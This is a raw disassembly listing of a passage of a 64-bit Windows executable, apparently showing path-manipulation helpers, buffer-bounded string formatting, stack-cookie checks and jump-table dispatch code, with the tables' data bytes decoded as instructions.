   14000445a:	48 8b fa             	mov    %rdx,%rdi
   14000445d:	4d 8b c8             	mov    %r8,%r9
   140004460:	4c 8d 05 15 76 02 00 	lea    0x27615(%rip),%r8        # 0x14002ba7c
   140004467:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000446c:	48 8b d9             	mov    %rcx,%rbx
   14000446f:	e8 0c d8 ff ff       	call   0x140001c80
   140004474:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004479:	7d 4d                	jge    0x1400044c8
   14000447b:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140004480:	48 8b cb             	mov    %rbx,%rcx
   140004483:	e8 88 8f 00 00       	call   0x14000d410
   140004488:	48 85 c0             	test   %rax,%rax
   14000448b:	74 3b                	je     0x1400044c8
   14000448d:	c6 00 00             	movb   $0x0,(%rax)
   140004490:	48 8b d7             	mov    %rdi,%rdx
   140004493:	48 ff c0             	inc    %rax
   140004496:	48 2b d0             	sub    %rax,%rdx
   140004499:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400044a0:	0f b6 08             	movzbl (%rax),%ecx
   1400044a3:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   1400044a6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400044aa:	84 c9                	test   %cl,%cl
   1400044ac:	75 f2                	jne    0x1400044a0
   1400044ae:	38 0b                	cmp    %cl,(%rbx)
   1400044b0:	74 16                	je     0x1400044c8
   1400044b2:	0f b6 07             	movzbl (%rdi),%eax
   1400044b5:	f6 d8                	neg    %al
   1400044b7:	1b c0                	sbb    %eax,%eax
   1400044b9:	f7 d8                	neg    %eax
   1400044bb:	ff c8                	dec    %eax
   1400044bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044c2:	48 83 c4 20          	add    $0x20,%rsp
   1400044c6:	5f                   	pop    %rdi
   1400044c7:	c3                   	ret
   1400044c8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044cd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400044d2:	48 83 c4 20          	add    $0x20,%rsp
   1400044d6:	5f                   	pop    %rdi
   1400044d7:	c3                   	ret
   1400044d8:	cc                   	int3
   1400044d9:	cc                   	int3
   1400044da:	cc                   	int3
   1400044db:	cc                   	int3
   1400044dc:	cc                   	int3
   1400044dd:	cc                   	int3
   1400044de:	cc                   	int3
   1400044df:	cc                   	int3
   1400044e0:	40 53                	rex push %rbx
   1400044e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400044e6:	4c 8b ca             	mov    %rdx,%r9
   1400044e9:	4c 8d 05 8c 75 02 00 	lea    0x2758c(%rip),%r8        # 0x14002ba7c
   1400044f0:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400044f5:	48 8b d9             	mov    %rcx,%rbx
   1400044f8:	e8 83 d7 ff ff       	call   0x140001c80
   1400044fd:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004502:	7c 08                	jl     0x14000450c
   140004504:	32 c0                	xor    %al,%al
   140004506:	48 83 c4 20          	add    $0x20,%rsp
   14000450a:	5b                   	pop    %rbx
   14000450b:	c3                   	ret
   14000450c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004513:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   140004518:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000451c:	75 f5                	jne    0x140004513
   14000451e:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140004523:	75 05                	jne    0x14000452a
   140004525:	c6 44 18 ff 00       	movb   $0x0,-0x1(%rax,%rbx,1)
   14000452a:	ba 5c 00 00 00       	mov    $0x5c,%edx
   14000452f:	48 8b cb             	mov    %rbx,%rcx
   140004532:	e8 55 8f 00 00       	call   0x14000d48c
   140004537:	48 85 c0             	test   %rax,%rax
   14000453a:	74 0b                	je     0x140004547
   14000453c:	c6 00 00             	movb   $0x0,(%rax)
   14000453f:	b0 01                	mov    $0x1,%al
   140004541:	48 83 c4 20          	add    $0x20,%rsp
   140004545:	5b                   	pop    %rbx
   140004546:	c3                   	ret
   140004547:	66 c7 03 2e 00       	movw   $0x2e,(%rbx)
   14000454c:	b0 01                	mov    $0x1,%al
   14000454e:	48 83 c4 20          	add    $0x20,%rsp
   140004552:	5b                   	pop    %rbx
   140004553:	c3                   	ret
   140004554:	cc                   	int3
   140004555:	cc                   	int3
   140004556:	cc                   	int3
   140004557:	cc                   	int3
   140004558:	cc                   	int3
   140004559:	cc                   	int3
   14000455a:	cc                   	int3
   14000455b:	cc                   	int3
   14000455c:	cc                   	int3
   14000455d:	cc                   	int3
   14000455e:	cc                   	int3
   14000455f:	cc                   	int3
   140004560:	b8 78 20 00 00       	mov    $0x2078,%eax
   140004565:	e8 e6 82 00 00       	call   0x14000c850
   14000456a:	48 2b e0             	sub    %rax,%rsp
   14000456d:	48 8b 05 cc 9a 03 00 	mov    0x39acc(%rip),%rax        # 0x14003e040
   140004574:	48 33 c4             	xor    %rsp,%rax
   140004577:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   14000457e:	00 
   14000457f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004585:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000458a:	e8 01 4e 00 00       	call   0x140009390
   14000458f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004594:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004599:	e8 76 17 01 00       	call   0x140015d14
   14000459e:	33 c9                	xor    %ecx,%ecx
   1400045a0:	85 c0                	test   %eax,%eax
   1400045a2:	0f 94 c1             	sete   %cl
   1400045a5:	8b c1                	mov    %ecx,%eax
   1400045a7:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   1400045ae:	00 
   1400045af:	48 33 cc             	xor    %rsp,%rcx
   1400045b2:	e8 99 7f 00 00       	call   0x14000c550
   1400045b7:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   1400045be:	c3                   	ret
   1400045bf:	cc                   	int3
   1400045c0:	40 53                	rex push %rbx
   1400045c2:	b8 50 20 00 00       	mov    $0x2050,%eax
   1400045c7:	e8 84 82 00 00       	call   0x14000c850
   1400045cc:	48 2b e0             	sub    %rax,%rsp
   1400045cf:	48 8b 05 6a 9a 03 00 	mov    0x39a6a(%rip),%rax        # 0x14003e040
   1400045d6:	48 33 c4             	xor    %rsp,%rax
   1400045d9:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   1400045e0:	00 
   1400045e1:	48 8b da             	mov    %rdx,%rbx
   1400045e4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400045ea:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400045ef:	e8 9c 4d 00 00       	call   0x140009390
   1400045f4:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400045fa:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045ff:	48 8b cb             	mov    %rbx,%rcx
   140004602:	e8 89 4d 00 00       	call   0x140009390
   140004607:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000460c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004611:	e8 7e 19 01 00       	call   0x140015f94
   140004616:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   14000461d:	00 
   14000461e:	48 33 cc             	xor    %rsp,%rcx
   140004621:	e8 2a 7f 00 00       	call   0x14000c550
   140004626:	48 81 c4 50 20 00 00 	add    $0x2050,%rsp
   14000462d:	5b                   	pop    %rbx
   14000462e:	c3                   	ret
   14000462f:	cc                   	int3
   140004630:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004635:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000463a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000463f:	57                   	push   %rdi
   140004640:	48 83 ec 20          	sub    $0x20,%rsp
   140004644:	49 8b f0             	mov    %r8,%rsi
   140004647:	4c 8b ca             	mov    %rdx,%r9
   14000464a:	bd 00 10 00 00       	mov    $0x1000,%ebp
   14000464f:	4c 8d 05 26 74 02 00 	lea    0x27426(%rip),%r8        # 0x14002ba7c
   140004656:	8b d5                	mov    %ebp,%edx
   140004658:	48 8b f9             	mov    %rcx,%rdi
   14000465b:	e8 20 d6 ff ff       	call   0x140001c80
   140004660:	48 63 c8             	movslq %eax,%rcx
   140004663:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
   14000466a:	73 66                	jae    0x1400046d2
   14000466c:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rdi,1)
   140004671:	74 0a                	je     0x14000467d
   140004673:	66 c7 04 39 5c 00    	movw   $0x5c,(%rcx,%rdi,1)
   140004679:	48 83 c1 02          	add    $0x2,%rcx
   14000467d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140004684:	48 2b e9             	sub    %rcx,%rbp
   140004687:	48 8b c3             	mov    %rbx,%rax
   14000468a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004690:	48 ff c0             	inc    %rax
   140004693:	80 3c 06 00          	cmpb   $0x0,(%rsi,%rax,1)
   140004697:	75 f7                	jne    0x140004690
   140004699:	48 3b c5             	cmp    %rbp,%rax
   14000469c:	73 34                	jae    0x1400046d2
   14000469e:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   1400046a3:	4c 8b c5             	mov    %rbp,%r8
   1400046a6:	48 8b d6             	mov    %rsi,%rdx
   1400046a9:	48 8b cf             	mov    %rdi,%rcx
   1400046ac:	75 1a                	jne    0x1400046c8
   1400046ae:	e8 7d 16 01 00       	call   0x140015d30
   1400046b3:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   1400046b8:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400046bc:	75 f5                	jne    0x1400046b3
   1400046be:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   1400046c3:	48 8b c7             	mov    %rdi,%rax
   1400046c6:	eb 0c                	jmp    0x1400046d4
   1400046c8:	e8 63 16 01 00       	call   0x140015d30
   1400046cd:	48 8b c7             	mov    %rdi,%rax
   1400046d0:	eb 02                	jmp    0x1400046d4
   1400046d2:	33 c0                	xor    %eax,%eax
   1400046d4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046d9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400046de:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400046e3:	48 83 c4 20          	add    $0x20,%rsp
   1400046e7:	5f                   	pop    %rdi
   1400046e8:	c3                   	ret
   1400046e9:	cc                   	int3
   1400046ea:	cc                   	int3
   1400046eb:	cc                   	int3
   1400046ec:	cc                   	int3
   1400046ed:	cc                   	int3
   1400046ee:	cc                   	int3
   1400046ef:	cc                   	int3
   1400046f0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400046f5:	57                   	push   %rdi
   1400046f6:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400046fb:	e8 50 81 00 00       	call   0x14000c850
   140004700:	48 2b e0             	sub    %rax,%rsp
   140004703:	48 8b 05 36 99 03 00 	mov    0x39936(%rip),%rax        # 0x14003e040
   14000470a:	48 33 c4             	xor    %rsp,%rax
   14000470d:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   140004714:	00 
   140004715:	48 8b da             	mov    %rdx,%rbx
   140004718:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000471e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004723:	48 8b f9             	mov    %rcx,%rdi
   140004726:	e8 65 4c 00 00       	call   0x140009390
   14000472b:	48 85 c0             	test   %rax,%rax
   14000472e:	74 74                	je     0x1400047a4
   140004730:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004736:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000473d:	00 
   14000473e:	48 8b cb             	mov    %rbx,%rcx
   140004741:	e8 4a 4c 00 00       	call   0x140009390
   140004746:	48 85 c0             	test   %rax,%rax
   140004749:	74 59                	je     0x1400047a4
   14000474b:	45 33 c0             	xor    %r8d,%r8d
   14000474e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004753:	44 39 05 ae 98 03 00 	cmp    %r8d,0x398ae(%rip)        # 0x14003e008
   14000475a:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140004761:	00 
   140004762:	b8 02 00 00 00       	mov    $0x2,%eax
   140004767:	44 0f 45 c0          	cmovne %eax,%r8d
   14000476b:	ff 15 7f 69 02 00    	call   *0x2697f(%rip)        # 0x14002b0f0
   140004771:	84 c0                	test   %al,%al
   140004773:	75 2b                	jne    0x1400047a0
   140004775:	83 3d 8c 98 03 00 00 	cmpl   $0x0,0x3988c(%rip)        # 0x14003e008
   14000477c:	74 26                	je     0x1400047a4
   14000477e:	ff 15 4c 69 02 00    	call   *0x2694c(%rip)        # 0x14002b0d0
   140004784:	83 f8 57             	cmp    $0x57,%eax
   140004787:	75 1b                	jne    0x1400047a4
   140004789:	48 8b d3             	mov    %rbx,%rdx
   14000478c:	c7 05 72 98 03 00 00 	movl   $0x0,0x39872(%rip)        # 0x14003e008
   140004793:	00 00 00 
   140004796:	48 8b cf             	mov    %rdi,%rcx
   140004799:	e8 52 ff ff ff       	call   0x1400046f0
   14000479e:	eb 09                	jmp    0x1400047a9
   1400047a0:	33 c0                	xor    %eax,%eax
   1400047a2:	eb 05                	jmp    0x1400047a9
   1400047a4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400047a9:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400047b0:	00 
   1400047b1:	48 33 cc             	xor    %rsp,%rcx
   1400047b4:	e8 97 7d 00 00       	call   0x14000c550
   1400047b9:	48 8b 9c 24 50 40 00 	mov    0x4050(%rsp),%rbx
   1400047c0:	00 
   1400047c1:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400047c8:	5f                   	pop    %rdi
   1400047c9:	c3                   	ret
   1400047ca:	cc                   	int3
   1400047cb:	cc                   	int3
   1400047cc:	cc                   	int3
   1400047cd:	cc                   	int3
   1400047ce:	cc                   	int3
   1400047cf:	cc                   	int3
   1400047d0:	40 53                	rex push %rbx
   1400047d2:	b8 40 20 00 00       	mov    $0x2040,%eax
   1400047d7:	e8 74 80 00 00       	call   0x14000c850
   1400047dc:	48 2b e0             	sub    %rax,%rsp
   1400047df:	48 8b 05 5a 98 03 00 	mov    0x3985a(%rip),%rax        # 0x14003e040
   1400047e6:	48 33 c4             	xor    %rsp,%rax
   1400047e9:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   1400047f0:	00 
   1400047f1:	48 8b da             	mov    %rdx,%rbx
   1400047f4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400047fa:	48 8b d1             	mov    %rcx,%rdx
   1400047fd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004802:	e8 01 26 01 00       	call   0x140016e08
   140004807:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000480c:	e8 5b 31 01 00       	call   0x14001796c
   140004811:	48 89 03             	mov    %rax,(%rbx)
   140004814:	48 f7 d8             	neg    %rax
   140004817:	1b c0                	sbb    %eax,%eax
   140004819:	f7 d8                	neg    %eax
   14000481b:	ff c8                	dec    %eax
   14000481d:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140004824:	00 
   140004825:	48 33 cc             	xor    %rsp,%rcx
   140004828:	e8 23 7d 00 00       	call   0x14000c550
   14000482d:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140004834:	5b                   	pop    %rbx
   140004835:	c3                   	ret
   140004836:	cc                   	int3
   140004837:	cc                   	int3
   140004838:	cc                   	int3
   140004839:	cc                   	int3
   14000483a:	cc                   	int3
   14000483b:	cc                   	int3
   14000483c:	cc                   	int3
   14000483d:	cc                   	int3
   14000483e:	cc                   	int3
   14000483f:	cc                   	int3
   140004840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004845:	55                   	push   %rbp
   140004846:	48 8b ec             	mov    %rsp,%rbp
   140004849:	48 83 ec 70          	sub    $0x70,%rsp
   14000484d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004854:	49 8b d9             	mov    %r9,%rbx
   140004857:	4c 8b d9             	mov    %rcx,%r11
   14000485a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004861:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004868:	45 03 d2             	add    %r10d,%r10d
   14000486b:	44 0b d0             	or     %eax,%r10d
   14000486e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004875:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004879:	77 7a                	ja     0x1400048f5
   14000487b:	48 8d 15 7e b7 ff ff 	lea    -0x4882(%rip),%rdx        # 0x140000000
   140004882:	49 63 c2             	movslq %r10d,%rax
   140004885:	8b 8c 82 08 49 00 00 	mov    0x4908(%rdx,%rax,4),%ecx
   14000488c:	48 03 ca             	add    %rdx,%rcx
   14000488f:	ff e1                	jmp    *%rcx
   140004891:	4d 63 c8             	movslq %r8d,%r9
   140004894:	4d 8d 43 58          	lea    0x58(%r11),%r8
   140004898:	48 8b 05 51 d5 03 00 	mov    0x3d551(%rip),%rax        # 0x140041df0
   14000489f:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400048a3:	49 8b d3             	mov    %r11,%rdx
   1400048a6:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400048ab:	ff 15 ff 6b 02 00    	call   *0x26bff(%rip)        # 0x14002b4b0
   1400048b1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400048b5:	0f 10 00             	movups (%rax),%xmm0
   1400048b8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400048bc:	48 8b 05 d5 d5 03 00 	mov    0x3d5d5(%rip),%rax        # 0x140041e98
   1400048c3:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400048c7:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400048cb:	ff 15 df 6b 02 00    	call   *0x26bdf(%rip)        # 0x14002b4b0
   1400048d1:	f7 d8                	neg    %eax
   1400048d3:	1b c0                	sbb    %eax,%eax
   1400048d5:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400048dc:	00 
   1400048dd:	48 83 c4 70          	add    $0x70,%rsp
   1400048e1:	5d                   	pop    %rbp
   1400048e2:	c3                   	ret
   1400048e3:	4d 63 c8             	movslq %r8d,%r9
   1400048e6:	4d 8d 43 68          	lea    0x68(%r11),%r8
   1400048ea:	eb ac                	jmp    0x140004898
   1400048ec:	4d 63 c8             	movslq %r8d,%r9
   1400048ef:	4d 8d 43 78          	lea    0x78(%r11),%r8
   1400048f3:	eb a3                	jmp    0x140004898
   1400048f5:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400048fc:	00 
   1400048fd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004902:	48 83 c4 70          	add    $0x70,%rsp
   140004906:	5d                   	pop    %rbp
   140004907:	c3                   	ret
   140004908:	91                   	xchg   %eax,%ecx
   140004909:	48 00 00             	rex.W add %al,(%rax)
   14000490c:	f5                   	cmc
   14000490d:	48 00 00             	rex.W add %al,(%rax)
   140004910:	91                   	xchg   %eax,%ecx
   140004911:	48 00 00             	rex.W add %al,(%rax)
   140004914:	f5                   	cmc
   140004915:	48 00 00             	rex.W add %al,(%rax)
   140004918:	e3 48                	jrcxz  0x140004962
   14000491a:	00 00                	add    %al,(%rax)
   14000491c:	f5                   	cmc
   14000491d:	48 00 00             	rex.W add %al,(%rax)
   140004920:	ec                   	in     (%dx),%al
   140004921:	48 00 00             	rex.W add %al,(%rax)
   140004924:	f5                   	cmc
   140004925:	48 00 00             	rex.W add %al,(%rax)
   140004928:	ec                   	in     (%dx),%al
   140004929:	48 00 00             	rex.W add %al,(%rax)
   14000492c:	f5                   	cmc
   14000492d:	48 00 00             	rex.W add %al,(%rax)
   140004930:	ec                   	in     (%dx),%al
   140004931:	48 00 00             	rex.W add %al,(%rax)
   140004934:	ec                   	in     (%dx),%al
   140004935:	48 00 00             	rex.W add %al,(%rax)
   140004938:	cc                   	int3
   140004939:	cc                   	int3
   14000493a:	cc                   	int3
   14000493b:	cc                   	int3
   14000493c:	cc                   	int3
   14000493d:	cc                   	int3
   14000493e:	cc                   	int3
   14000493f:	cc                   	int3
   140004940:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004945:	55                   	push   %rbp
   140004946:	48 8b ec             	mov    %rsp,%rbp
   140004949:	48 83 ec 50          	sub    $0x50,%rsp
   14000494d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004954:	4d 8b d9             	mov    %r9,%r11
   140004957:	48 8b d9             	mov    %rcx,%rbx
   14000495a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004961:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004968:	45 03 d2             	add    %r10d,%r10d
   14000496b:	44 0b d0             	or     %eax,%r10d
   14000496e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004975:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004979:	0f 87 1a 01 00 00    	ja     0x140004a99
   14000497f:	48 8d 15 7a b6 ff ff 	lea    -0x4986(%rip),%rdx        # 0x140000000
   140004986:	49 63 c2             	movslq %r10d,%rax
   140004989:	8b 8c 82 ac 4a 00 00 	mov    0x4aac(%rdx,%rax,4),%ecx
   140004990:	48 03 ca             	add    %rdx,%rcx
   140004993:	ff e1                	jmp    *%rcx
   140004995:	48 8b 05 54 d4 03 00 	mov    0x3d454(%rip),%rax        # 0x140041df0
   14000499c:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049a0:	4d 63 c8             	movslq %r8d,%r9
   1400049a3:	48 8b d3             	mov    %rbx,%rdx
   1400049a6:	4c 8d 83 00 01 00 00 	lea    0x100(%rbx),%r8
   1400049ad:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   1400049b2:	ff 15 f8 6a 02 00    	call   *0x26af8(%rip)        # 0x14002b4b0
   1400049b8:	0f 10 00             	movups (%rax),%xmm0
   1400049bb:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400049bf:	c7 83 f8 00 00 00 01 	movl   $0x1,0xf8(%rbx)
   1400049c6:	00 00 00 
   1400049c9:	48 8b 05 c8 d4 03 00 	mov    0x3d4c8(%rip),%rax        # 0x140041e98
   1400049d0:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049d4:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   1400049d8:	0f 29 4d f0          	movaps %xmm1,-0x10(%rbp)
   1400049dc:	ff 15 ce 6a 02 00    	call   *0x26ace(%rip)        # 0x14002b4b0
   1400049e2:	f7 d8                	neg    %eax
   1400049e4:	1b c0                	sbb    %eax,%eax
   1400049e6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400049eb:	48 83 c4 50          	add    $0x50,%rsp
   1400049ef:	5d                   	pop    %rbp
   1400049f0:	c3                   	ret
   1400049f1:	48 8b 05 f8 d3 03 00 	mov    0x3d3f8(%rip),%rax        # 0x140041df0
   1400049f8:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049fc:	4d 63 c8             	movslq %r8d,%r9
   1400049ff:	48 8b d3             	mov    %rbx,%rdx
   140004a02:	4c 8d 83 20 01 00 00 	lea    0x120(%rbx),%r8
   140004a09:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a0e:	ff 15 9c 6a 02 00    	call   *0x26a9c(%rip)        # 0x14002b4b0
   140004a14:	0f 10 00             	movups (%rax),%xmm0
   140004a17:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a1b:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%rbx)
   140004a22:	00 00 00 
   140004a25:	eb a2                	jmp    0x1400049c9
   140004a27:	48 8b 05 c2 d3 03 00 	mov    0x3d3c2(%rip),%rax        # 0x140041df0
   140004a2e:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a32:	4d 63 c8             	movslq %r8d,%r9
   140004a35:	48 8b d3             	mov    %rbx,%rdx
   140004a38:	4c 8d 83 38 01 00 00 	lea    0x138(%rbx),%r8
   140004a3f:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a44:	ff 15 66 6a 02 00    	call   *0x26a66(%rip)        # 0x14002b4b0
   140004a4a:	0f 10 00             	movups (%rax),%xmm0
   140004a4d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a51:	c7 83 30 01 00 00 01 	movl   $0x1,0x130(%rbx)
   140004a58:	00 00 00 
   140004a5b:	e9 69 ff ff ff       	jmp    0x1400049c9
   140004a60:	48 8b 05 89 d3 03 00 	mov    0x3d389(%rip),%rax        # 0x140041df0
   140004a67:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a6b:	4d 63 c8             	movslq %r8d,%r9
   140004a6e:	48 8b d3             	mov    %rbx,%rdx
   140004a71:	4c 8d 83 40 01 00 00 	lea    0x140(%rbx),%r8
   140004a78:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a7d:	ff 15 2d 6a 02 00    	call   *0x26a2d(%rip)        # 0x14002b4b0
   140004a83:	0f 10 00             	movups (%rax),%xmm0
   140004a86:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a8a:	c7 83 38 01 00 00 01 	movl   $0x1,0x138(%rbx)
   140004a91:	00 00 00 
   140004a94:	e9 30 ff ff ff       	jmp    0x1400049c9
   140004a99:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004a9e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004aa3:	48 83 c4 50          	add    $0x50,%rsp
   140004aa7:	5d                   	pop    %rbp
   140004aa8:	c3                   	ret
   140004aa9:	0f 1f 00             	nopl   (%rax)
   140004aac:	95                   	xchg   %eax,%ebp
   140004aad:	49 00 00             	rex.WB add %al,(%r8)
   140004ab0:	99                   	cltd
   140004ab1:	4a 00 00             	rex.WX add %al,(%rax)
   140004ab4:	95                   	xchg   %eax,%ebp
   140004ab5:	49 00 00             	rex.WB add %al,(%r8)
   140004ab8:	99                   	cltd
   140004ab9:	4a 00 00             	rex.WX add %al,(%rax)
   140004abc:	f1                   	int1
   140004abd:	49 00 00             	rex.WB add %al,(%r8)
   140004ac0:	99                   	cltd
   140004ac1:	4a 00 00             	rex.WX add %al,(%rax)
   140004ac4:	27                   	(bad)
   140004ac5:	4a 00 00             	rex.WX add %al,(%rax)
   140004ac8:	99                   	cltd
   140004ac9:	4a 00 00             	rex.WX add %al,(%rax)
   140004acc:	27                   	(bad)
   140004acd:	4a 00 00             	rex.WX add %al,(%rax)
   140004ad0:	99                   	cltd
   140004ad1:	4a 00 00             	rex.WX add %al,(%rax)
   140004ad4:	60                   	(bad)
   140004ad5:	4a 00 00             	rex.WX add %al,(%rax)
   140004ad8:	60                   	(bad)
   140004ad9:	4a 00 00             	rex.WX add %al,(%rax)
   140004adc:	cc                   	int3
   140004add:	cc                   	int3
   140004ade:	cc                   	int3
   140004adf:	cc                   	int3
   140004ae0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ae5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004aea:	57                   	push   %rdi
   140004aeb:	48 83 ec 70          	sub    $0x70,%rsp
   140004aef:	49 8b c0             	mov    %r8,%rax
   140004af2:	48 8b fa             	mov    %rdx,%rdi
   140004af5:	48 8b f1             	mov    %rcx,%rsi
   140004af8:	45 33 c0             	xor    %r8d,%r8d
   140004afb:	48 8b c8             	mov    %rax,%rcx
   140004afe:	33 d2                	xor    %edx,%edx
   140004b00:	e8 8b 48 00 00       	call   0x140009390
   140004b05:	48 8b d8             	mov    %rax,%rbx
   140004b08:	48 85 c0             	test   %rax,%rax
   140004b0b:	75 17                	jne    0x140004b24
   140004b0d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004b12:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b17:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b1b:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b1f:	49 8b e3             	mov    %r11,%rsp
   140004b22:	5f                   	pop    %rdi
   140004b23:	c3                   	ret
   140004b24:	48 8b 05 bd d2 03 00 	mov    0x3d2bd(%rip),%rax        # 0x140041de8
   140004b2b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004b30:	4c 8b cb             	mov    %rbx,%r9
   140004b33:	4c 8b c7             	mov    %rdi,%r8
   140004b36:	48 8b d6             	mov    %rsi,%rdx
   140004b39:	ff 15 71 69 02 00    	call   *0x26971(%rip)        # 0x14002b4b0
   140004b3f:	48 8b cb             	mov    %rbx,%rcx
   140004b42:	0f 10 00             	movups (%rax),%xmm0
   140004b45:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004b4a:	0f 10 40 10          	movups 0x10(%rax),%xmm0
   140004b4e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004b53:	e8 d8 03 01 00       	call   0x140014f30
   140004b58:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
